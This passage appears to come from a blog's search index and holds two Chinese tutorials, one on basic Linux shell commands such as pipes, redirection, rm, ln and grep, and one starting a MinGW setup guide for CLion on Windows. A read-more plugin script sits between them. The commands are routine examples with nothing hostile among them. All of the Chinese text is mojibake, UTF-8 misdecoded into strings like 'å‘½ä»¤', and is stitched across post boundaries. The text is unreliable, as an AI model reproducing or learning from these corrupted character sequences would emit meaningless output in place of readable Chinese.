...ï¼šå‘½ä»¤çš„å‚æ•°ï¼Œå¯ä»¥æ˜¯é›¶ä¸ªã€ä¸€ä¸ªæˆ–è€…å¤šä¸ª åŸºç¡€å‘½ä»¤ç®¡é“ |ç®¡é“ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºå¯ä»¥é€šè¿‡ç®¡é“åšä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚ç®€å•æ¦‚æ‹¬ï¼Œç®¡é“å¯ä»¥ç†è§£ç°å®ç”Ÿæ´»ä¸­çš„ç®¡å­ï¼Œç®¡å­çš„ä¸€å¤´å¡ä¸œè¥¿è¿›å»ï¼Œå¦ä¸€å¤´å–å‡ºæ¥ï¼Œè¿™é‡Œ | çš„å·¦å³åˆ†ä¸ºä¸¤ç«¯ï¼Œå·¦ç«¯å¡ä¸œè¥¿ï¼ˆå†™ï¼‰ï¼Œå³ç«¯å–ä¸œè¥¿ï¼ˆè¯»ï¼‰ã€‚ 1$ ls -alh | more æ¸…å± clearclear ä½œç”¨ä¸ºæ¸…é™¤ç»ˆç«¯ä¸Šçš„æ˜¾ç¤ºï¼ˆç±»ä¼¼äº DOS çš„ cls æ¸…å±åŠŸèƒ½ï¼‰ï¼Œä¹Ÿå¯ä½¿ç”¨å¿«æ·é”®ï¼šctrl + lã€‚ 1$ clear è¾“å‡ºé‡å®šå‘ &gt;Linux å…è®¸å°†å‘½ä»¤æ‰§è¡Œç»“æœé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæœ¬åº”æ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šçš„å†…å®¹ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ã€‚&gt; è¾“å‡ºé‡å®šå‘ä¼šè¦†ç›–åŸæ¥çš„å†…å®¹ï¼Œ&gt;&gt; è¾“å‡ºé‡å®šå‘åˆ™ä¼šå°†å†…å®¹è¿½åŠ åˆ°æ–‡ä»¶çš„å°¾éƒ¨ã€‚ 12345# è¦†ç›–æ–‡ä»¶å†…å®¹$ ls &gt; abc.txt# è¿½åŠ æ–‡ä»¶å†…å®¹$ date &gt;&gt; abc.txt åˆ‡æ¢å·¥ä½œç›®å½• cdåœ¨ä½¿ç”¨ Unix/Linux çš„æ—¶å€™ï¼Œç»å¸¸éœ€è¦æ›´æ¢å·¥ä½œç›®å½•ï¼Œcd å‘½ä»¤å¯ä»¥å¸®åŠ©ç”¨æˆ·åˆ‡æ¢å·¥ä½œç›®å½•ã€‚Linux æ‰€æœ‰çš„ç›®å½•å’Œæ–‡ä»¶åéƒ½åŒºåˆ†å¤§å°å†™ã€‚cd å‘½ä»¤åé¢å¯è·Ÿç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥è·Ÿç›¸å¯¹è·¯å¾„ï¼›å¦‚æœçœç•¥ç›®å½•ï¼Œåˆ™é»˜è®¤åˆ‡æ¢åˆ°å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ã€‚ æ˜¾ç¤ºå½“å‰è·¯å¾„ pwdä½¿ç”¨ pwd å‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰çš„å·¥ä½œç›®å½•ï¼Œè¯¥å‘½ä»¤å¾ˆç®€å•ï¼Œç›´æ¥è¾“å…¥ pwd å³å¯ï¼Œåé¢ä¸å¸¦å‚æ•°ã€‚ æŸ¥çœ‹å‘½ä»¤ä½ç½® whichwhich å‘½ä»¤å¯ä»¥ç”¨æ¥æŸ¥çœ‹ç‰¹å®šå‘½ä»¤çš„å…·ä½“ä½ç½®ã€‚ 12# æŸ¥çœ‹lså‘½ä»¤çš„ä½ç½®$ which ls å¸®åŠ©æ–‡æ¡£æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ manman æ˜¯ Linux æä¾›çš„ä¸€ä¸ªå¸®åŠ©æ‰‹å†Œå‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹ç»å¤§éƒ¨åˆ†å‘½ä»¤ã€å‡½æ•°çš„ä½¿ç”¨è¯´æ˜ã€‚è¯¥å¸®åŠ©æ‰‹å†Œåˆ†æˆå¾ˆå¤šç« èŠ‚ï¼ˆsectionï¼‰ï¼Œä½¿ç”¨ man å‘½ä»¤æ—¶å¯ä»¥æŒ‡å®šä¸åŒçš„ç« èŠ‚æ¥æµè§ˆä¸åŒçš„å†…å®¹ã€‚å„ä¸ªç« èŠ‚ï¼ˆsectionï¼‰çš„å«ä¹‰å¦‚ä¸‹ï¼š 1ï¼Standard commandsï¼ˆæ ‡å‡†å‘½ä»¤ï¼‰ 2ï¼System callsï¼ˆç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚ open,writeï¼‰ 3ï¼Library functionsï¼ˆåº“å‡½æ•°ï¼Œå¦‚ printf,fopenï¼‰ 4ï¼Special devicesï¼ˆè®¾å¤‡æ–‡ä»¶çš„è¯´æ˜ï¼Œ/dev ä¸‹å„ç§è®¾å¤‡ï¼‰ 5ï¼File formatsï¼ˆæ–‡ä»¶æ ¼å¼ï¼Œå¦‚ passwdï¼‰ 6ï¼Games and toysï¼ˆæ¸¸æˆå’Œå¨±ä¹ï¼‰ 7ï¼Miscellaneousï¼ˆæ‚é¡¹ã€æƒ¯ä¾‹ä¸åå®šç­‰ï¼Œä¾‹å¦‚ Linux æ¡£æ¡ˆç³»ç»Ÿã€ç½‘ç»œåå®šã€ASCII ç ï¼›environ å…¨å±€å˜é‡ï¼‰ 8ï¼Administrative Commandsï¼ˆç®¡ç†å‘˜å‘½ä»¤ï¼Œå¦‚ ifconfigï¼‰ man å‘½ä»¤çš„ä½¿ç”¨æ ¼å¼æ˜¯ï¼šman [é€‰é¡¹] å‘½ä»¤åç§°ï¼Œä¾‹å¦‚æŸ¥çœ‹ ls å‘½ä»¤çš„ç”¨æ³•å¯ä»¥ä½¿ç”¨ï¼šman 1 lsï¼Œå…¶ä¸­ 1 æ˜¯æ•°å­—ï¼Œä»£è¡¨ç¬¬ 1 ä¸ª ç« èŠ‚ï¼ˆsectionï¼‰ã€‚å®é™…ä¸Šï¼Œä¸€èˆ¬ä¸ç”¨æŒ‡å®šç¬¬å‡ ä¸ªç« èŠ‚ä¹Ÿå¯ä»¥æ­£å¸¸æŸ¥çœ‹ï¼Œä¾‹å¦‚ man lsã€‚ä½†æ˜¯æœ‰ä¸€ç§æƒ…å†µé™¤å¤–ï¼Œå‡å¦‚å‘½ä»¤çš„åç§°å’Œå‡½æ•°çš„åç§°åˆšå¥½ç›¸åŒï¼ˆå¦‚ï¼šprintfï¼‰ï¼Œå®ƒæ—¢æ˜¯å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥æ˜¯åº“å‡½æ•°ï¼›å¦‚æœä¸æŒ‡å®šç« èŠ‚å·ç›´æ¥ä½¿ç”¨ man printfï¼Œé‚£ä¹ˆå®ƒåªèƒ½æŸ¥çœ‹å‘½ä»¤çš„ç”¨æ³•ï¼Œä¸èƒ½æŸ¥çœ‹å‡½æ•°çš„ç”¨æ³•ï¼Œå› ä¸º man å‘½ä»¤æ˜¯æŒ‰ç…§æ‰‹å†Œçš„ç« èŠ‚å·çš„é¡ºåºè¿›è¡Œæœç´¢çš„ã€‚man å‘½ä»¤è®¾ç½®äº†å¦‚ä¸‹çš„åŠŸèƒ½é”®ï¼š æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ - -help--help ä¸€èˆ¬æ˜¯ Linux å‘½ä»¤è‡ªå¸¦çš„é€‰é¡¹ï¼Œä½†å¹¶ä¸æ˜¯æ‰€æœ‰å‘½ä»¤éƒ½è‡ªå¸¦è¿™ä¸ªé€‰é¡¹ï¼Œä¾‹å¦‚ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ ls å‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£ï¼š 1$ ls --help æ–‡ä»¶ç®¡ç†æŸ¥çœ‹æ–‡ä»¶åˆ—è¡¨ lsls æ˜¯è‹±æ–‡å•è¯ list çš„ç®€å†™ï¼Œå…¶åŠŸèƒ½ä¸ºåˆ—å‡ºç›®å½•çš„å†…å®¹ï¼Œæ˜¯ç”¨æˆ·æœ€å¸¸ç”¨çš„å‘½ä»¤ä¹‹ä¸€ï¼Œå®ƒç±»ä¼¼äº DOS ç³»ç»Ÿä¸‹çš„ dir å‘½ä»¤ã€‚Linux æ–‡ä»¶æˆ–è€…ç›®å½•åç§°æœ€é•¿å¯ä»¥æœ‰ 256 ä¸ªå­—ç¬¦ï¼Œ. ä»£è¡¨å½“å‰ç›®å½•ï¼Œ.. ä»£è¡¨ä¸Šä¸€çº§ç›®å½•ï¼Œä»¥ . å¼€å¤´çš„æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ï¼Œéœ€è¦ç”¨ -a å‚æ•°æ‰èƒ½æ˜¾ç¤ºã€‚ ä¸ DOS ç³»ç»Ÿä¸‹çš„æ–‡ä»¶æ“ä½œç±»ä¼¼ï¼Œåœ¨ Unix/Linux ç³»ç»Ÿä¸­ï¼Œä¹ŸåŒæ ·å…è®¸ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦æ¥åŒæ—¶å¼•ç”¨å¤šä¸ªæ–‡ä»¶åï¼Œè¿™äº›ç‰¹æ®Šå­—ç¬¦è¢«ç§°ä¸º é€šé…ç¬¦ã€‚ åˆ›å»ºç›®å½• mkdiré€šè¿‡ mkdir å‘½ä»¤å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½•ï¼Œå‚æ•° -p å¯é€’å½’åˆ›å»ºç›®å½•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ–°å»ºç›®å½•çš„åç§°ä¸èƒ½ä¸å½“å‰ç›®å½•ä¸­å·²æœ‰çš„ç›®å½•æˆ–æ–‡ä»¶åŒåï¼Œå¹¶ä¸”ç›®å½•åˆ›å»ºè€…å¿…é¡»å¯¹å½“å‰ç›®å½•å…·æœ‰å†™æƒé™ã€‚ 123$ mkdir www$ mkdir -p www/nginx/ åˆ é™¤ç›®å½• rmdirå¯ä½¿ç”¨ rmdir å‘½ä»¤åˆ é™¤ä¸€ä¸ªç›®å½•ï¼Œä½†å¿…é¡»ç¦»å¼€ç›®å½•ï¼Œå¹¶ä¸”ç›®å½•å¿…é¡»ä¸ºç©ºç›®å½•ï¼Œä¸ç„¶ä¼šæç¤ºåˆ é™¤å¤±è´¥ åˆ é™¤æ–‡ä»¶ rmå¯é€šè¿‡ rm å‘½ä»¤åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚ä½¿ç”¨ rm å‘½ä»¤è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºæ–‡ä»¶åˆ é™¤åä¸èƒ½æ¢å¤ã€‚ä¸ºäº†é˜²æ­¢æ–‡ä»¶è¯¯åˆ ï¼Œå¯ä»¥åœ¨ rm å‘½ä»¤åä½¿ç”¨ -i å‚æ•°ä»¥é€ä¸ªç¡®è®¤è¦åˆ é™¤çš„æ–‡ä»¶ã€‚ç»“åˆ -r å‚æ•°ï¼Œå¯ä»¥é€’å½’åˆ é™¤éç©ºç›®å½•é‡Œçš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚ 123$ rm run.log$ rm -rf /www/share/ æ‹·è´æ–‡ä»¶ cpcp å‘½ä»¤çš„åŠŸèƒ½æ˜¯å°†ç»™å‡ºçš„æ–‡ä»¶æˆ–ç›®å½•å¤åˆ¶åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•ä¸­ï¼Œç›¸å½“äº DOS ä¸‹çš„ copy å‘½ä»¤ã€‚ ç§»åŠ¨æ–‡ä»¶ mvç”¨æˆ·å¯ä»¥ä½¿ç”¨ mv å‘½ä»¤æ¥ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¹Ÿå¯ä»¥ç»™æ–‡ä»¶æˆ–ç›®å½•é‡å‘½åã€‚ 12345678# æ–‡ä»¶é‡å‘½å$ mv run.log runtime.log# ç§»åŠ¨æ–‡ä»¶$ mv /tmp/run.log /usr/local/share/# ç§»åŠ¨ç›®å½•$ mv /tmp/share/ /usr/local/share/ åˆ›å»ºæ–‡ä»¶ touchtouch å‘½ä»¤ç”¨äºä¿®æ”¹æ–‡ä»¶æˆ–è€…ç›®å½•çš„æ—¶é—´å±æ€§ï¼ŒåŒ…æ‹¬å­˜å–æ—¶é—´å’Œæ›´æ”¹æ—¶é—´ï¼Œè‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚å‘½ä»¤æ ¼å¼ä¸ºï¼š touch [-acfm] [-d&lt;æ—¥æœŸæ—¶é—´&gt;] [-r&lt;å‚è€ƒæ–‡ä»¶æˆ–ç›®å½•&gt;] [-t&lt;æ—¥æœŸæ—¶é—´&gt;] [--help] [--version][æ–‡ä»¶æˆ–ç›®å½•...] -aï¼šæ›´æ”¹æ–‡ä»¶çš„è¯»å–æ—¶é—´è®°å½• -mï¼šæ›´æ”¹æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´è®°å½• -cï¼šå‡å¦‚æŒ‡å®šçš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¸ä¼šåˆ›å»ºæ–°çš„æ–‡ä»¶ï¼Œä¸ --no-create çš„æ•ˆæœä¸€æ · -fï¼šå¯å¿½ç•¥ä¸ä½¿ç”¨ï¼Œæ˜¯ä¸ºäº†ä¸å…¶ä»– Unix ç³»ç»Ÿçš„ç›¸å®¹æ€§è€Œä¿ç•™ -rï¼šä½¿ç”¨å…¶ä»–æ–‡ä»¶çš„æ—¶é—´ä¿¡æ¯ï¼Œè€Œä¸æ˜¯å½“å‰ç³»ç»Ÿæ—¶é—´ -dï¼šè®¾å®šæ—¶é—´ä¸æ—¥æœŸï¼Œå¯ä»¥ä½¿ç”¨å„ç§ä¸åŒçš„æ ¼å¼ -tï¼šè®¾å®šæ–‡ä»¶çš„æ—¶é—´ä¿¡æ¯ï¼Œæ ¼å¼ä¸ date å‘½ä»¤ç›¸åŒ --no-createï¼šä¸åˆ›å»ºæ–°çš„æ–‡ä»¶ 12# ä¿®æ”¹æ–‡ä»¶æ—¶é—´å±æ€§ä¸ºå½“å‰ç³»ç»Ÿæ—¶é—´$ touch testfile å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä½¿ç”¨ touch å‘½ä»¤æ—¶ï¼Œå¦‚æœæŒ‡å®šçš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™å°†åˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºç™½æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹ï¼Œä½¿ç”¨è¯¥æŒ‡ä»¤åˆ›å»ºä¸€ä¸ªç©ºç™½æ–‡ä»¶ newfileï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ touch newfile å»ºç«‹é“¾æ¥æ–‡ä»¶ lnLinux çš„é“¾æ¥æ–‡ä»¶ç±»ä¼¼äº Windows ä¸‹çš„å¿«æ·æ–¹å¼ï¼Œé“¾æ¥æ–‡ä»¶åˆ†ä¸º è½¯é“¾æ¥ å’Œ ç¡¬é“¾æ¥: ç¡¬é“¾æ¥ï¼šç¡¬é“¾æ¥åªèƒ½é“¾æ¥æ™®é€šæ–‡ä»¶ï¼Œä¸èƒ½é“¾æ¥ç›®å½•ï¼Œå‘½ä»¤æ ¼å¼ï¼šln æºæ–‡ä»¶ é“¾æ¥æ–‡ä»¶ è½¯é“¾æ¥ï¼šè½¯é“¾æ¥ä¸å ç”¨ç£ç›˜ç©ºé—´ï¼Œæºæ–‡ä»¶åˆ é™¤åˆ™è½¯é“¾æ¥å¤±æ•ˆï¼Œå‘½ä»¤æ ¼å¼ï¼šln -s æºæ–‡ä»¶ é“¾æ¥æ–‡ä»¶ 1$ ln -s /bin/less /usr/local/bin/less å¦‚æœæ²¡æœ‰ -s é€‰é¡¹åˆ™ä»£è¡¨å»ºç«‹ä¸€ä¸ªç¡¬é“¾æ¥æ–‡ä»¶ï¼Œä¸¤ä¸ªæ–‡ä»¶å ç”¨ç›¸åŒå¤§å°çš„ç¡¬ç›˜ç©ºé—´ï¼Œå³ä½¿åˆ é™¤äº†æºæ–‡ä»¶ï¼Œé“¾æ¥æ–‡ä»¶è¿˜æ˜¯å­˜åœ¨ï¼Œæ‰€ä»¥ -s é€‰é¡¹æ˜¯æ›´å¸¸è§çš„ä½¿ç”¨å½¢å¼ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œå¦‚æœè½¯é“¾æ¥æ–‡ä»¶å’Œæºæ–‡ä»¶ä¸åœ¨åŒä¸€ä¸ªç›®å½•ï¼Œæºæ–‡ä»¶è¦ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œä¸èƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚ è·å–æ–‡ä»¶ç±»å‹ fileLinux ç³»ç»Ÿæ–‡ä»¶ç±»å‹ä¸æ˜¯æ ¹æ®æ–‡ä»¶æ‰©å±•ååˆ†ç±»çš„ï¼Œé€šè¿‡ file å‘½ä»¤å¯ä»¥ç¡®è®¤æ–‡ä»¶çš„å…·ä½“ç±»å‹ã€‚ 1$ file run.log æ–‡ä»¶å†…å®¹æœç´¢ grepLinux ç³»ç»Ÿä¸­çš„ grep å‘½ä»¤æ˜¯ä¸€ç§å¼ºå¤§çš„æ–‡æœ¬æœç´¢å·¥å…·ï¼Œgrep å‘½ä»¤å…è®¸å¯¹æ–‡æœ¬æ–‡ä»¶è¿›è¡Œæ¨¡å¼æŸ¥æ‰¾ã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…æ¨¡å¼ï¼Œgrep å‘½ä»¤ä¼šæ‰“å°åŒ…å«æ¨¡å¼çš„æ‰€æœ‰è¡Œã€‚grep å‘½ä»¤çš„æ ¼å¼ä¸º grep [-é€‰é¡¹] "æœç´¢å†…å®¹" æ–‡ä»¶åã€‚ 12345678# åœ¨æ–‡ä»¶ä¸­æœç´¢å­—ç¬¦ä¸²$ grep "time" /tmp/run.log# åœ¨æ–‡ä»¶ä¸­æœç´¢å­—ç¬¦ä¸²ï¼Œä¸åŒºåˆ†å¤§å°å†™$ grep -i "time" /tmp/run.log# åœ¨æ–‡ä»¶ä¸­æœç´¢å­—ç¬¦ä¸²ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œæ˜¾ç¤ºè¡Œå·$ grep -i -n "time" /tmp/run.log å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ grep å‘½ä»¤ä¸­è¾“å…¥å­—ç¬¦ä¸²å‚æ•°æ—¶ï¼Œæœ€å¥½ä½¿ç”¨å¼•å·æˆ–åŒå¼•å·æ‹¬èµ·æ¥ï¼Œä¾‹å¦‚ï¼šgrep "a" run.logã€‚ è®¡ç®—æ–‡ä»¶è¡Œæ•°æˆ–å­—æ•° wc 1234567891011 # ç»Ÿè®¡æ–‡ä»¶è¡Œæ•° $ wc -l run.log# ç»Ÿè®¡æ–‡ä»¶å­—æ•°$ wc -w run.log# ç»Ÿè®¡æ–‡ä»¶å­—èŠ‚æ•°$ wc -c run.log# ç»Ÿè®¡æ–‡ä»¶å­—ç¬¦æ•°$ wc -m run.log åˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ moreæŸ¥çœ‹å†…å®¹æ—¶ï¼Œåœ¨ä¿¡æ¯è¿‡é•¿æ— æ³•åœ¨ä¸€å±ä¸Šæ˜¾ç¤ºæ—¶ï¼Œä¼šå‡ºç°å¿«é€Ÿæ»šå±ï¼Œä½¿å¾—ç”¨æˆ·æ— æ³•çœ‹æ¸…æ–‡ä»¶çš„å†…å®¹ã€‚æ­¤æ—¶å¯ä»¥ä½¿ç”¨ more å‘½ä»¤ï¼Œæ¯æ¬¡åªæ˜¾ç¤ºä¸€é¡µï¼ŒæŒ‰ä¸‹ ç©ºæ ¼é”® å¯ä»¥æ˜¾ç¤ºä¸‹ä¸€é¡µï¼ŒæŒ‰ä¸‹ å›è½¦é”® å¯ä»¥æ˜¾ç¤ºä¸‹ä¸€è¡Œï¼ŒæŒ‰ä¸‹ q é”®é€€å‡ºæ˜¾ç¤ºï¼ŒæŒ‰ä¸‹ h é”®å¯ä»¥è·å–å¸®åŠ©ã€‚ 1$ more README.md æŸ¥çœ‹æˆ–è€…åˆå¹¶æ–‡ä»¶å†…å®¹ cat12345# æŸ¥çœ‹æ–‡ä»¶å†…å®¹$ cat 1.log# åˆå¹¶æ–‡ä»¶å†…å®¹$ cat 1.log 2.log &gt; 3.log æ–‡ä»¶å‹ç¼©è§£å‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linuxç³»ç»Ÿç¼–ç¨‹"},{title:"Windows ç³»ç»Ÿä¸‹ CLion é…ç½® MinGW",url:"/posts/60b40ee7.html",text:'MinGW ä»‹ç»MinGW çš„ç®€ä»‹MinGW æ˜¯ Minimalist GNU on Windows çš„ç¼©å†™ã€‚å®ƒæ˜¯ä¸€ä¸ªå¯è‡ªç”±ä½¿ç”¨å’Œè‡ªç”±å‘å¸ƒçš„ Windows ç‰¹å®šå¤´æ–‡ä»¶å’Œä½¿ç”¨ GNU å·¥å…·é›†å¯¼å…¥åº“çš„é›†åˆï¼Œå…è®¸å¼€å‘è€…åœ¨ Linux å’Œ Windows å¹³å°ç”Ÿæˆæœ¬åœ°çš„ Windows ç¨‹åºè€Œä¸éœ€è¦ç¬¬ä¸‰æ–¹ C è¿è¡Œæ—¶ï¼ˆC Runtimeï¼‰åº“ã€‚MinGW å®é™…ä¸Šæ˜¯å°†ç»å…¸çš„å¼€æº C è¯­è¨€ç¼–è¯‘å™¨ GCC ç§»æ¤åˆ°äº† Windows å¹³å°ä¸‹ï¼Œå¹¶ä¸”åŒ…å«äº† Win32API å’Œ MSYSï¼Œå› æ­¤å¯ä»¥å°†æºä»£ç ç¼–è¯‘ç”Ÿæˆ Windows ä¸‹çš„å¯æ‰§è¡Œç¨‹åºï¼Œåˆèƒ½å¦‚åŒåœ¨ Linux å¹³å°ä¸‹æ—¶ï¼Œä½¿ç”¨ä¸€äº› Windows ä¸å…·å¤‡çš„å¼€å‘å·¥å…·ã€‚ç®€å•ä¸€å¥è¯æ¦‚å†µï¼ŒMinGW å°±æ˜¯ GCC çš„ Windows ç‰ˆæœ¬ ã€‚ MinGW çš„ä¼˜åŠ¿ MinGW æ”¯æŒæœ€æ–°çš„ C è¯­è¨€ æ ‡å‡† MinGW æ˜¯å¼€æºè½¯ä»¶ï¼Œå¯ä»¥å…è´¹ä½¿ç”¨ MinGW ç”±ä¸€ä¸ªæ´»è·ƒçš„å¼€æºç¤¾åŒºåœ¨æŒç»­ç»´æŠ¤ï¼Œå› æ­¤ä¸ä¼šè¿‡æ—¶ MinGW ä½¿ç”¨ Windows çš„ C è¯­è¨€è¿è¡Œåº“ï¼Œå› æ­¤ç¼–è¯‘å‡ºçš„ç¨‹åºä¸éœ€è¦ç¬¬ä¸‰æ–¹ DLL ï¼Œå¯ä»¥ç›´æ¥åœ¨ Windows ä¸‹è¿è¡Œ é‚£äº›è‘—åçš„å¼€æº IDE å®é™…åªæ˜¯å°† MinGW å°è£…äº†èµ·æ¥ï¼Œä½¿å®ƒæ‹¥æœ‰å‹å¥½çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œç®€åŒ–äº†æ“ä½œï¼Œä½†å†…éƒ¨æ ¸å¿ƒä»ç„¶æ˜¯ MinGW MinGW æ˜¯ç¨³å®šå¯é çš„ã€æŒç»­æ›´æ–°çš„ C/C++ ç¼–è¯‘å™¨ï¼Œä½¿ç”¨å®ƒå¯ä»¥å…å»å¾ˆå¤šéº»çƒ¦ï¼Œä¸ç”¨æ‹…å¿ƒè·Ÿä¸ä¸Šæ—¶ä»£ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒç¼–è¯‘å™¨æœ¬èº«æœ‰ä¸¥é‡æ¼æ´ï¼Œå¯ä»¥æ”¾å¿ƒçš„å»ç¼–å†™ç¨‹åºã€‚ MinGW å®‰è£…ç®¡ç†å™¨ä¸‹è½½ MinGW å®‰è£…ç®¡ç†å™¨æµè§ˆå™¨è®¿é—® è¿™é‡Œï¼Œä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ MinGW å®‰è£…ç®¡ç†å™¨ mingw-get-setup.exe å®‰è£… MinGW å®‰è£…ç®¡ç†å™¨ ä½¿ç”¨ç³»ç»Ÿç®¡ç†å‘˜æƒé™è¿è¡Œ mingw-get-setup.exe é€‰æ‹© MinGW å®‰è£…ç®¡ç†å™¨çš„å®‰è£…ä½ç½® å¼€å§‹ä¸‹è½½ MinGW å®‰è£…ç®¡ç†å™¨ï¼Œä¸€èˆ¬æ¥è¯´å¹¶ä¸ä¼šèŠ±è´¹å¤ªé•¿æ—¶é—´ï¼Œåœ¨æ•°åˆ†é’ŸèŒƒå›´å†…å³å¯å®Œæˆ MinGW ç»„ä»¶å®‰è£…MinGW å®‰è£…ç®¡ç†å™¨å®‰è£…å®Œæˆåï¼Œä¼šåœ¨æ¡Œé¢åˆ›å»ºä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œä»¥ååªè¦åŒå‡»å®ƒå°±å¯ä»¥å¯åŠ¨ MinGW å®‰è£…ç®¡ç†å™¨ï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç®¡ç† MinGW å·²å®‰è£…çš„ç»„ä»¶ï¼Œæˆ–è€…æ·»åŠ å®‰è£…æ–°çš„ç»„ä»¶ ç•Œé¢ä»‹ç»ä¸€èˆ¬æ¥è¯´ï¼Œåªéœ€è¦ä¸€äº›åŸºç¡€ç»„ä»¶å°±å¯ä»¥æ»¡è¶³ç¼–è¯‘ C/C++ ç¨‹åºçš„éœ€æ±‚ï¼Œæ‰€ä»¥é€‰æ‹©å·¦ä¾§ç›®å½•ä¸­çš„ç¬¬ä¸€é¡¹ Basic Setup å³å¯ï¼Œä¹‹åå°±å¯ä»¥åœ¨å³ä¾§é€‰æ‹©éœ€è¦çš„ç»„ä»¶äº† å‹¾é€‰ç»„ä»¶åœ¨ç»„ä»¶ä¸Šå•å‡»é¼ æ ‡å³é”®ï¼Œç„¶ååœ¨å¼¹å‡ºçš„å³é”®èœå•ä¸­å•å‡» Mark for Installation é€‰é¡¹ï¼Œå³å¯å°†ç»„ä»¶è¿›è¡Œæ ‡è®°ã€‚åœ¨ä¹‹åçš„æ“ä½œå®Œæˆåï¼Œç®¡ç†å™¨å°†ä¼šè‡ªåŠ¨å®‰è£…è¢«æ ‡è®°äº†çš„ç»„ä»¶ é€‰æ‹©ç»„ä»¶å¦‚æœåªæ˜¯ä¸ºäº†ç¼–è¯‘ C/C++ ç¨‹åºï¼Œé‚£ä¹ˆåªéœ€å®‰è£… mingw-developer-toolkitã€mingw32-baseã€mingw32-gcc-g++ã€msys-base è¿™ 4 ä¸ªåŸºç¡€ç»„ä»¶å³å¯ åº”ç”¨æ›´æ”¹åœ¨ä¸Šè¿°æ‰€éœ€çš„ 4 ä¸ªåŸºç¡€ç»„ä»¶éƒ½å·²å‹¾é€‰å®Œæˆåï¼Œå•å‡»èœå•æ ä¸Šçš„ Installation é€‰é¡¹ï¼Œå¹¶åœ¨å¼¹å‡ºçš„èœå•ä¸­å•å‡» Apply Changes é€‰é¡¹ ç¡®è®¤å®‰è£…åœ¨å¼¹å‡ºçš„ç¡®è®¤çª—å£é‡Œï¼Œç›´æ¥å•å‡» Apply æŒ‰é’®ï¼Œä¹‹åå®‰è£…ç®¡ç†å™¨å°±ä¼šçœŸæ­£åœ°å¼€å§‹ä¸‹è½½å’Œå®‰è£… MinGW äº† MinGW å®‰è£…ç®¡ç†å™¨ä¼šä¸€è¾¹ä¸‹è½½ä¸€è¾¹å®‰è£… MinGWï¼Œè¿™ä¸€è¿‡ç¨‹å¯èƒ½ä¼šèŠ±è´¹å¾ˆé•¿çš„æ—¶é—´ã€‚ç”±äº MinGW å®‰è£…ç®¡ç†å™¨è¿æ¥çš„æ˜¯å›½å¤–çš„æœåŠ¡å™¨ï¼Œè¿™ä¼šå¯¼è‡´ä¸‹è½½é€Ÿåº¦ç¼“æ…¢ï¼Œæ‰€ä»¥éœ€è¦è€å¿ƒåœ°ç­‰å¾…ä¸€æ®µæ—¶é—´ å®‰è£…å®Œæˆ æ£€æŸ¥æ›´æ–° å·²å®‰è£…ç»„ä»¶ MinGW ç¯å¢ƒå˜é‡é…ç½®å®‰è£…ç›®å½•ç»“æ„MinGW å®‰è£…åï¼Œæœ¬åœ°ç£ç›˜çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼Œé»˜è®¤å®‰è£…è·¯å¾„æ˜¯ C:\\MinGW\\ æ·»åŠ ç¯å¢ƒå˜é‡å°† MinGW 